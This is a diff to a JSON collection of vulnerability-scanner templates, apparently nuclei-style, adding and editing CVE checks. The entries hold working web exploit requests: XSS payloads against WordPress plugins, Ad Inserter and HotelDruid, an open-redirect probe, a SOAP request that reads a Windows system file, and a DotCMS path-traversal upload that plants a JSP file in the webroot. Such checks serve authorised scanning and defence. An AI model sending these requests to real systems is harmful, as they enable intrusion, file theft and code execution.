@@ -10911,9 +10911,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "content-type": "text/xml",
             "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml"
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
           },
           "method": "POST",
           "path": [
@@ -13757,7 +13757,7 @@
       "id": "CVE-2021-25111",
       "info": {
         "name": "English WordPress Admin < 1.5.2 - Unauthenticated Open Redirect",
-        "severity": "low"
+        "severity": "medium"
       },
       "requests": [
         {
@@ -15689,7 +15689,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/?unix:{{repeat(\"A\", 7701)}}|http://{{interactsh-url}}/"
+            "{{BaseURL}}/?unix:{{repeat(\"A\", 7701)}}|http://interact.sh/"
           ]
         }
       ]
@@ -16717,6 +16717,21 @@
       ]
     },
     {
+      "id": "CVE-2022-0165",
+      "info": {
+        "name": "WordPress Page Builder KingComposer <= 2.9.6 - Open Redirect",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-admin/admin-ajax.php?action=kc_get_thumbn&id=https://example.com"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-0189",
       "info": {
         "name": "WordPress RSS Aggregator < 4.20 - Authenticated Reflected Cross-Site Scripting",
@@ -16727,6 +16742,21 @@
           "raw": [
             "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{RootURL}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_test_cookie=WP%20Cookie%20check\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1\n",
             "POST /wp-admin/admin-ajax.php?action=wprss_fetch_items_row_action HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_test_cookie=WP%20Cookie%20check\n\nid=%3Chtml%3E%3Cimg+src+onerror%3Dalert%28%60document.domain%60%29%3E\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-0201",
+      "info": {
+        "name": "WordPress Permalink Manager < 2.2.15 - Reflected Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?p=%3Cimg%20src%20onerror=alert(/XSS/)%3E&debug_url=1"
           ]
         }
       ]
@@ -16787,6 +16817,25 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/api/users/search_authors"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-0288",
+      "info": {
+        "name": "Ad Inserter < 2.7.10 - Reflected Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "body": "html_element_selection=</script><img+src+onerror=alert(document.domain)>\n",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}"
           ]
         }
       ]
@@ -17376,6 +17425,38 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/plugins/web/service/search/auto-completion/domain/en.xml?q=adm"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-26352",
+      "info": {
+        "name": "DotCMS Arbitrary File Upload",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /api/content/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=------------------------aadc326f7ae3eac3\n\n--------------------------aadc326f7ae3eac3\nContent-Disposition: form-data; name=\"name\"; filename=\"../../../../../../../../../srv/dotserver/tomcat-9.0.41/webapps/ROOT/{{randstr}}.jsp\"\nContent-Type: text/plain\n\n<%\nout.println(\"CVE-2022-26352\");\n%>\n--------------------------aadc326f7ae3eac3--\n",
+            "GET /{{randstr}}.jsp HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-26564",
+      "info": {
+        "name": "HotelDruid Hotel Management Software 3.0.3 XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/creaprezzi.php?prezzoperiodo4=%22><script>javascript:alert(%27XSS%27)</script>",
+            "{{BaseURL}}/modifica_cliente.php?tipo_tabella=%22><script>javascript:alert(%27XSS%27)</script>&idclienti=1",
+            "{{BaseURL}}/dati/availability_tpl.php?num_app_tipo_richiesti1=%22><script>javascript:alert(%27XSS%27)</script>"
           ]
         }
       ]
